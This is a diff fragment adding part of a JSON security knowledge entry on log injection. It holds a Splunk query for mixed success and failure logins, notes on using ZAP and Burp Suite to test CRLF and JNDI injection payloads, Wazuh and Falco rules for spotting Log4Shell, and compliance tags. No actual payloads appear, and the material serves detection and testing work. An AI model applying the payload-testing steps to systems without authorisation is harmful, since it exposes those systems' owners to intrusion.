authentication events\nindex=auth_logs sourcetype=authentication\n| transaction user maxspan=1m\n| where eventcount > 1\n| eval has_success=if(like(_raw, \"%successful%\") OR like(_raw, \"%succeeded%\"), 1, 0)\n| eval has_failure=if(like(_raw, \"%failed%\") OR like(_raw, \"%failure%\"), 1, 0)\n| where has_success=1 AND has_failure=1\n| stats count by user, src_ip\n| where count > 3"
+      }
+    ],
+    "tools": [
+      {
+        "name": "OWASP ZAP",
+        "type": "Web Application Security Scanner",
+        "usage": "Configure active scan rules for log injection and CRLF injection detection"
+      },
+      {
+        "name": "Burp Suite",
+        "type": "Web Security Testing",
+        "usage": "Use Intruder to test log injection payloads with CRLF and JNDI patterns"
+      },
+      {
+        "name": "Wazuh",
+        "type": "Security Monitoring",
+        "usage": "Configure rules to detect Log4Shell and log injection patterns in real-time"
+      },
+      {
+        "name": "Falco",
+        "type": "Runtime Security",
+        "usage": "Monitor container logs for suspicious patterns and JNDI lookups"
+      }
+    ]
+  },
+  "metadata_tags": {
+    "industry": [
+      "Financial Services",
+      "Healthcare",
+      "E-commerce",
+      "SaaS",
+      "Government",
+      "Critical Infrastructure"
+    ],
+    "compliance": [
+      "PCI-DSS 4.0 (Requirement 10.2.4, 10.2.5)",
+      "HIPAA (164.312(b) - Audit Controls)",
+      "SOC2 (CC7.2 - System Monitoring)",
+      "ISO27001 (A.12.4.1 - Event logging)",
+      "GDPR (Article 32 - Security of processing)",
+      "NIST 800-53 (AU-3 - Content of Audit Records)",
+      "CIS Controls (8.2 - Collect Audit Logs)"
+    ],
+    "deployment": [
+      "Cloud",
+      "On-Premise",
+      "Hybrid",
+      "Containerized"
+    ],
+    "data_classification": [
+      "Public",
+      "Internal",
+      "Confidential",
+      "Audit Logs"
+    ]
+  }
+}
